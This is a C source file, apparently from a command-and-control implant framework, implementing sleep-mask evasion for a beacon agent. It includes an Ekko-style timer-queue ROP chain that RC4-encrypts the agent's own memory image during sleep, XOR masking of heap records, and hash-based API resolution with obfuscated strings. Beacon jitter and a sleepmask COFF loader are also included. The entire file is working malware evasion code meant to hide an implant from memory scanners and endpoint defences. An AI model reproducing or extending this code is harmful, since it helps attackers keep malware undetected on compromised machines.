#include "config.h"
#include "common.h"
#include "crypto.h"
#include "evasion/sleepmask.h"
#include "evasion/beacon_gate_impl.h"

#ifdef INCLUDE_EVASION_HELLSHALL
#include "evasion/hellshall.h"
#endif

VOID sleep_mask_none(PINSTANCE inst, DWORD ms) {
    inst->Win32.Sleep(ms);
}

VOID sleep_mask_default(PINSTANCE inst, DWORD ms) {
    // XOR heap records during sleep
    BEACON_INFO* bi = &inst->BeaconInfo;
    if (bi->heap_records) {
        HEAP_RECORD* hr = bi->heap_records;
        while (hr->ptr) {
            xor_bytes((BYTE*)hr->ptr, hr->size, (const BYTE*)bi->mask, MASK_SIZE);
            hr++;
        }
    }

    inst->Win32.Sleep(ms);

    // Unmask
    if (bi->heap_records) {
        HEAP_RECORD* hr = bi->heap_records;
        while (hr->ptr) {
            xor_bytes((BYTE*)hr->ptr, hr->size, (const BYTE*)bi->mask, MASK_SIZE);
            hr++;
        }
    }
}

// ─── Ekko Sleep: Timer-Queue ROP Chain with Encryption ───
// Encrypts agent image during sleep using SystemFunction032 (RC4),
// executed via NtContinue-based ROP gadgets on timer-queue worker threads.
//
// Adapted for PIC: no globals, all APIs resolved via resolve_function/DJB2,
// all strings via xstr(), all memory via es_malloc/es_free.
// Ekko sleep is x64-only. On x86, the CONTEXT ROP chain would need crafted
// stack frames for each stdcall API (no register-based arg passing), which
// adds significant complexity for minimal gain. Fall back to default mask.
#if SLEEP_MASK_TYPE == MASK_EKKO && defined(_WIN64)

// USTRING for SystemFunction032
typedef struct _USTRING {
    DWORD Length;
    DWORD MaximumLength;
    PVOID Buffer;
} USTRING, *PUSTRING;

// Event types for NtCreateEvent
#define NotificationEvent   0
#define SynchronizationEvent 1

// Ekko context count: 8 CONTEXT structs for the ROP chain
#define EKKO_NUM_CONTEXTS   8

// Function pointer types resolved at runtime
typedef NTSTATUS (NTAPI *fnRtlCreateTimerQueue)(PHANDLE);
typedef NTSTATUS (NTAPI *fnRtlCreateTimer)(HANDLE, PHANDLE, PVOID, PVOID, DWORD, DWORD, ULONG);
typedef NTSTATUS (NTAPI *fnRtlDeleteTimerQueueEx)(HANDLE, HANDLE);
typedef VOID     (WINAPI *fnRtlCaptureContext)(PCONTEXT);
typedef NTSTATUS (NTAPI *fnNtCreateEvent)(PHANDLE, ACCESS_MASK, PVOID, DWORD, BOOLEAN);
typedef NTSTATUS (NTAPI *fnNtSignalAndWaitForSingleObject)(HANDLE, HANDLE, BOOLEAN, PVOID);
typedef NTSTATUS (NTAPI *fnNtContinue)(PCONTEXT, BOOLEAN);
typedef NTSTATUS (NTAPI *fnSystemFunction032)(PUSTRING, PUSTRING);
typedef BOOL     (WINAPI *fnSetEvent)(HANDLE);
typedef DWORD    (WINAPI *fnWaitForSingleObjectEx)(HANDLE, DWORD, BOOL);
typedef BOOL     (WINAPI *fnVirtualProtect_t)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef NTSTATUS (NTAPI *fnNtClose_t)(HANDLE);
typedef ULONG    (NTAPI *fnRtlRandomEx)(PULONG);
typedef ULONG    (NTAPI *fnNtGetTickCount)(VOID);

// WT_EXECUTEINTIMERTHREAD = 0x00000020
#define WT_EXECUTEINTIMERTHREAD 0x00000020

// Generate a random 16-byte encryption key (PIC-safe using RDTSC + LCG)
static VOID ekko_gen_key(PINSTANCE inst) {
    LARGE_INTEGER tsc;
    DWORD seed;

    // Resolve RtlRandomEx if available for better entropy
    xstr(_rrex, "RtlRandomEx");
    fnRtlRandomEx pRtlRandomEx = (fnRtlRandomEx)resolve_function(inst->Modules.Ntdll, hash_string_djb2(_rrex));

    for (int i = 0; i < 16; i += 4) {
        tsc.QuadPart = __rdtsc();
        seed = tsc.LowPart ^ (tsc.HighPart * 0x1337);

        if (pRtlRandomEx) {
            seed = pRtlRandomEx(&seed);
        } else {
            // Fallback: LCG
            seed = seed * 1103515245 + 12345;
        }

        inst->EkkoKey[i]     = (BYTE)((seed >> 0)  & 0xFF);
        inst->EkkoKey[i + 1] = (BYTE)((seed >> 8)  & 0xFF);
        inst->EkkoKey[i + 2] = (BYTE)((seed >> 16) & 0xFF);
        inst->EkkoKey[i + 3] = (BYTE)((seed >> 24) & 0xFF);
    }
}

VOID sleep_mask_ekko(PINSTANCE inst, DWORD ms) {
    USTRING     uKey       = { 0 };
    USTRING     uBuffer    = { 0 };
    HANDLE      EvntTimer  = NULL;
    HANDLE      EvntStart  = NULL;
    HANDLE      EvntEnd    = NULL;
    HANDLE      Queue      = NULL;
    NTSTATUS    NtStatus   = 0;
    HANDLE      Timer      = NULL;
    CONTEXT     CtxInit    = { 0 };
    DWORD       Delay      = 0;
    DWORD       OldProtect = 0;
    CONTEXT*    pContexts  = NULL;

    // ─── Resolve APIs ───
    PVOID ntdll = inst->Modules.Ntdll;
    PVOID k32   = inst->Modules.Kernel32;

    xstr(_rtlctq, "RtlCreateTimerQueue");
    xstr(_rtlct,  "RtlCreateTimer");
    xstr(_rtldtq, "RtlDeleteTimerQueueEx");
    xstr(_rtlcc,  "RtlCaptureContext");
    xstr(_sf032,  "SystemFunction032");
    xstr(_sevt,   "SetEvent");
    xstr(_wfso,   "WaitForSingleObjectEx");
    xstr(_vp,     "VirtualProtect");

    fnRtlCreateTimerQueue   pRtlCreateTimerQueue  = (fnRtlCreateTimerQueue)resolve_function(ntdll, hash_string_djb2(_rtlctq));
    fnRtlCreateTimer        pRtlCreateTimer       = (fnRtlCreateTimer)resolve_function(ntdll, hash_string_djb2(_rtlct));
    fnRtlDeleteTimerQueueEx pRtlDeleteTimerQueueEx = (fnRtlDeleteTimerQueueEx)resolve_function(ntdll, hash_string_djb2(_rtldtq));
    fnRtlCaptureContext     pRtlCaptureContext    = (fnRtlCaptureContext)resolve_function(ntdll, hash_string_djb2(_rtlcc));
    fnSetEvent              pSetEvent             = (fnSetEvent)resolve_function(k32, hash_string_djb2(_sevt));
    fnWaitForSingleObjectEx pWaitForSingleObjectEx = (fnWaitForSingleObjectEx)resolve_function(k32, hash_string_djb2(_wfso));
    fnVirtualProtect_t      pVirtualProtect       = (fnVirtualProtect_t)resolve_function(k32, hash_string_djb2(_vp));

    // SystemFunction032 is in advapi32 (or cryptbase.dll on newer Windows)
    fnSystemFunction032 pSystemFunction032 = NULL;
    if (inst->Modules.Advapi32)
        pSystemFunction032 = (fnSystemFunction032)resolve_function(inst->Modules.Advapi32, hash_string_djb2(_sf032));
    if (!pSystemFunction032) {
        xstr(_cryptbase, "cryptbase.dll");
        HMODULE hCryptBase = inst->Win32.LoadLibraryA(_cryptbase);
        if (hCryptBase)
            pSystemFunction032 = (fnSystemFunction032)resolve_function(hCryptBase, hash_string_djb2(_sf032));
    }

    // Resolve NtCreateEvent, NtSignalAndWaitForSingleObject, NtContinue, NtClose
    xstr(_nce,   "NtCreateEvent");
    xstr(_nsaw,  "NtSignalAndWaitForSingleObject");
    xstr(_ncont, "NtContinue");
    xstr(_ncl,   "NtClose");

    fnNtCreateEvent                 pNtCreateEvent              = (fnNtCreateEvent)resolve_function(ntdll, hash_string_djb2(_nce));
    fnNtSignalAndWaitForSingleObject pNtSignalAndWait           = (fnNtSignalAndWaitForSingleObject)resolve_function(ntdll, hash_string_djb2(_nsaw));
    fnNtContinue                    pNtContinue                 = (fnNtContinue)resolve_function(ntdll, hash_string_djb2(_ncont));
    fnNtClose_t                     pNtClose                    = (fnNtClose_t)resolve_function(ntdll, hash_string_djb2(_ncl));

    // Bail if any critical API is missing
    if (!pRtlCreateTimerQueue || !pRtlCreateTimer || !pRtlDeleteTimerQueueEx ||
        !pRtlCaptureContext || !pSetEvent || !pWaitForSingleObjectEx ||
        !pVirtualProtect || !pSystemFunction032 || !pNtCreateEvent ||
        !pNtSignalAndWait || !pNtContinue || !pNtClose) {
        DBG(inst, "[EKKO] API resolution failed, falling back");
        sleep_mask_default(inst, ms);
        return;
    }

    // ─── First-time init ───
    if (!inst->bEkkoInitialized) {
        ekko_gen_key(inst);
        inst->bEkkoInitialized = TRUE;
    }

    // Allocate CONTEXT array on heap (too large for stack in PIC)
    pContexts = (CONTEXT*)es_malloc(inst, sizeof(CONTEXT) * EKKO_NUM_CONTEXTS);
    if (!pContexts) {
        sleep_mask_default(inst, ms);
        return;
    }

    // ─── Determine memory regions to protect ───
    // In standalone PIC mode: encrypt the entire agent image
    PVOID pAgentBase = inst->Base.Buffer;
    SIZE_T szAgent   = inst->Base.Length;

    // If Base.Length is 0, try to discover via VirtualQuery
    if (szAgent == 0 && inst->Win32.VirtualQuery && pAgentBase) {
        MEMORY_BASIC_INFORMATION mbi;
        es_memset(&mbi, 0, sizeof(mbi));
        if (inst->Win32.VirtualQuery(pAgentBase, &mbi, sizeof(mbi))) {
            szAgent = mbi.RegionSize;
        }
    }

    if (!pAgentBase || szAgent == 0) {
        DBG(inst, "[EKKO] No agent base/size, falling back");
        es_free(inst, pContexts);
        sleep_mask_default(inst, ms);
        return;
    }

    // Populate USTRINGS for SystemFunction032
    uKey.Buffer          = inst->EkkoKey;
    uKey.Length           = sizeof(inst->EkkoKey);
    uKey.MaximumLength   = sizeof(inst->EkkoKey);
    uBuffer.Buffer       = pAgentBase;
    uBuffer.Length        = (DWORD)szAgent;
    uBuffer.MaximumLength = (DWORD)szAgent;

    // ─── Mask heap records ───
    BEACON_INFO* bi = &inst->BeaconInfo;
    if (bi->heap_records) {
        HEAP_RECORD* hr = bi->heap_records;
        while (hr->ptr) {
            xor_bytes((BYTE*)hr->ptr, hr->size, (const BYTE*)bi->mask, MASK_SIZE);
            hr++;
        }
    }

    // ─── Create timer queue ───
    NtStatus = pRtlCreateTimerQueue(&Queue);
    if (NtStatus < 0)
        goto LEAVE;

    // Create synchronization events
    NtStatus = pNtCreateEvent(&EvntTimer, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE);
    if (NtStatus < 0) goto LEAVE;
    NtStatus = pNtCreateEvent(&EvntStart, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE);
    if (NtStatus < 0) goto LEAVE;
    NtStatus = pNtCreateEvent(&EvntEnd, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE);
    if (NtStatus < 0) goto LEAVE;

    // ─── Timer 1: RtlCaptureContext → capture worker thread context ───
    Timer = NULL;
    NtStatus = pRtlCreateTimer(Queue, &Timer,
        (PVOID)pRtlCaptureContext, &CtxInit,
        Delay += 100, 0, WT_EXECUTEINTIMERTHREAD);
    if (NtStatus < 0) goto LEAVE;

    // ─── Timer 2: SetEvent → signal main thread that context is captured ───
    Timer = NULL;
    NtStatus = pRtlCreateTimer(Queue, &Timer,
        (PVOID)pSetEvent, EvntTimer,
        Delay += 100, 0, WT_EXECUTEINTIMERTHREAD);
    if (NtStatus < 0) goto LEAVE;

    // Wait for context capture
    pWaitForSingleObjectEx(EvntTimer, INFINITE, FALSE);

    // Adjust captured context: align RSP, set flags
    CtxInit.Rsp -= sizeof(PVOID);
    CtxInit.ContextFlags = CONTEXT_FULL;

    // ─── Populate 8 CONTEXT structs for the ROP chain ───
    for (int i = 0; i < EKKO_NUM_CONTEXTS; i++)
        es_memcpy(&pContexts[i], &CtxInit, sizeof(CONTEXT));

    // ctx[0]: WaitForSingleObjectEx(EvntStart, INFINITE, FALSE) - gate
    pContexts[0].Rip = (DWORD64)pWaitForSingleObjectEx;
    pContexts[0].Rcx = (DWORD64)EvntStart;
    pContexts[0].Rdx = (DWORD64)INFINITE;
    pContexts[0].R8  = (DWORD64)FALSE;

    // ctx[1]: VirtualProtect(pAgentBase, szAgent, PAGE_READWRITE, &OldProtect) - make writable
    pContexts[1].Rip = (DWORD64)pVirtualProtect;
    pContexts[1].Rcx = (DWORD64)pAgentBase;
    pContexts[1].Rdx = (DWORD64)szAgent;
    pContexts[1].R8  = (DWORD64)PAGE_READWRITE;
    pContexts[1].R9  = (DWORD64)&OldProtect;

    // ctx[2]: SystemFunction032(&uBuffer, &uKey) - encrypt agent memory
    pContexts[2].Rip = (DWORD64)pSystemFunction032;
    pContexts[2].Rcx = (DWORD64)&uBuffer;
    pContexts[2].Rdx = (DWORD64)&uKey;

    // ctx[3]: WaitForSingleObjectEx(NtCurrentProcess(), sleeptime, FALSE) - actual sleep
    pContexts[3].Rip = (DWORD64)pWaitForSingleObjectEx;
    pContexts[3].Rcx = (DWORD64)((HANDLE)(LONG_PTR)-1); // NtCurrentProcess()
    pContexts[3].Rdx = (DWORD64)ms;
    pContexts[3].R8  = (DWORD64)FALSE;

    // ctx[4]: SystemFunction032(&uBuffer, &uKey) - decrypt agent memory
    pContexts[4].Rip = (DWORD64)pSystemFunction032;
    pContexts[4].Rcx = (DWORD64)&uBuffer;
    pContexts[4].Rdx = (DWORD64)&uKey;

    // ctx[5]: VirtualProtect(pAgentBase, szAgent, PAGE_EXECUTE_READ, &OldProtect) - restore exec
    pContexts[5].Rip = (DWORD64)pVirtualProtect;
    pContexts[5].Rcx = (DWORD64)pAgentBase;
    pContexts[5].Rdx = (DWORD64)szAgent;
    pContexts[5].R8  = (DWORD64)PAGE_EXECUTE_READ;
    pContexts[5].R9  = (DWORD64)&OldProtect;

    // ctx[6]: VirtualProtect for sleepmask region (if UDRL) - in PIC mode, same as agent
    // Reuse agent base since sleepmask code IS the agent code in standalone mode
    pContexts[6].Rip = (DWORD64)pVirtualProtect;
    pContexts[6].Rcx = (DWORD64)pAgentBase;
    pContexts[6].Rdx = (DWORD64)szAgent;
    pContexts[6].R8  = (DWORD64)PAGE_EXECUTE_READ;
    pContexts[6].R9  = (DWORD64)&OldProtect;

    // ctx[7]: SetEvent(EvntEnd) - signal completion
    pContexts[7].Rip = (DWORD64)pSetEvent;
    pContexts[7].Rcx = (DWORD64)EvntEnd;

    // ─── Queue NtContinue timers for each context ───
    for (int i = 0; i < EKKO_NUM_CONTEXTS; i++) {
        Timer = NULL;
        NtStatus = pRtlCreateTimer(Queue, &Timer,
            (PVOID)pNtContinue, &pContexts[i],
            Delay += 100, 0, WT_EXECUTEINTIMERTHREAD);
        if (NtStatus < 0) goto LEAVE;
    }

    // ─── Fire the chain: signal EvntStart, wait for EvntEnd ───
    NtStatus = pNtSignalAndWait(EvntStart, EvntEnd, FALSE, NULL);

LEAVE:
    // ─── Cleanup ───
    if (Queue)
        pRtlDeleteTimerQueueEx(Queue, (HANDLE)(LONG_PTR)-1); // INVALID_HANDLE_VALUE = wait for completion

    if (EvntTimer) pNtClose(EvntTimer);
    if (EvntStart) pNtClose(EvntStart);
    if (EvntEnd)   pNtClose(EvntEnd);

    if (pContexts) es_free(inst, pContexts);

    // ─── Unmask heap records ───
    if (bi->heap_records) {
        HEAP_RECORD* hr = bi->heap_records;
        while (hr->ptr) {
            xor_bytes((BYTE*)hr->ptr, hr->size, (const BYTE*)bi->mask, MASK_SIZE);
            hr++;
        }
    }
}

#else // SLEEP_MASK_TYPE != MASK_EKKO || !_WIN64

VOID sleep_mask_ekko(PINSTANCE inst, DWORD ms) {
    // Ekko not enabled at compile time - fall back to default mask
    sleep_mask_default(inst, ms);
}

#endif // SLEEP_MASK_TYPE == MASK_EKKO

VOID populate_beacon_info(PINSTANCE inst) {
    BEACON_INFO* bi = &inst->BeaconInfo;
    ALLOCATED_MEMORY savedAm;
    es_memcpy(&savedAm, &bi->allocatedMemory, sizeof(ALLOCATED_MEMORY));
    es_memset(bi, 0, sizeof(BEACON_INFO));
    es_memcpy(&bi->allocatedMemory, &savedAm, sizeof(ALLOCATED_MEMORY));
    bi->version = ES_VERSION;

    if (inst->pfnSleepMask) {
        bi->sleep_mask_ptr = (char*)inst->pfnSleepMask;
        bi->sleep_mask_text_size = inst->dwSleepMaskTextSize;
        bi->sleep_mask_total_size = inst->dwSleepMaskTextSize;
    }

    bi->beacon_ptr = (char*)inst->Base.Buffer;

    LARGE_INTEGER counter;
    counter.QuadPart = __rdtsc();
    DWORD seed = counter.LowPart;
    for (int i = 0; i < MASK_SIZE; i++) {
        seed = seed * 1103515245 + 12345;
        bi->mask[i] = (char)(seed >> 16);
    }
}

#if SLEEP_MASK_TYPE == MASK_UDRL

static VOID sleep_mask_udrl(PINSTANCE inst, DWORD ms) {
    // Load sleepmask COFF on first call
    if (!inst->bSleepMaskLoaded) {
#ifdef SLEEPMASK_COFF_SIZE
        if (SLEEPMASK_COFF_SIZE > 0) {
            BOOL ok = sleepmask_load_coff(inst,
                (BYTE*)SLEEPMASK_COFF, SLEEPMASK_COFF_SIZE, "sleep_mask");
            if (!ok) {
                sleep_mask_none(inst, ms);
                return;
            }
        } else {
            sleep_mask_none(inst, ms);
            return;
        }
#else
        sleep_mask_none(inst, ms);
        return;
#endif
    }

    if (!inst->pfnSleepMask) {
        sleep_mask_none(inst, ms);
        return;
    }

    populate_beacon_info(inst);

    FUNCTION_CALL fc;
    es_memset(&fc, 0, sizeof(FUNCTION_CALL));
    fc.functionPtr = (PVOID)inst->Win32.Sleep;
    fc.function = SLEEP;
    fc.numOfArgs = 1;
    fc.args[0] = (ULONG_PTR)ms;
    fc.bMask = TRUE;

    void* saved_teb = coff_read_teb_user_ptr();
    coff_set_inst_for_mask(inst);

    typedef void (*SLEEPMASK_FN)(PBEACON_INFO, PFUNCTION_CALL);
    SLEEPMASK_FN fn = (SLEEPMASK_FN)inst->pfnSleepMask;
    fn(&inst->BeaconInfo, &fc);

    coff_restore_teb_user_ptr(saved_teb);
}

#endif // SLEEP_MASK_TYPE == MASK_UDRL

VOID do_sleep(PINSTANCE inst, DWORD ms) {
    if (inst->Config.jitter > 0 && ms > 0) {
        LARGE_INTEGER counter;
        counter.QuadPart = __rdtsc();
        DWORD jitter_range = (ms * inst->Config.jitter) / 100;
        if (jitter_range > 0) {
            DWORD offset = counter.LowPart % jitter_range;
            ms = ms - jitter_range / 2 + offset;
        }
    }

    if (inst->bBeaconGateEnabled && inst->pfnSleepMask && inst->bSleepMaskLoaded) {
        FUNCTION_CALL fc;
        es_memset(&fc, 0, sizeof(FUNCTION_CALL));
        fc.functionPtr = (PVOID)inst->Win32.Sleep;
        fc.function    = SLEEP;
        fc.numOfArgs   = 1;
        fc.args[0]     = (ULONG_PTR)ms;
        fc.bMask       = TRUE;
        beacon_gate_dispatch(inst, &fc);
        return;
    }

#if SLEEP_MASK_TYPE == MASK_NONE
    sleep_mask_none(inst, ms);
#elif SLEEP_MASK_TYPE == MASK_EKKO
    sleep_mask_ekko(inst, ms);
#elif SLEEP_MASK_TYPE == MASK_UDRL
    sleep_mask_udrl(inst, ms);
#else
    sleep_mask_default(inst, ms);
#endif
}
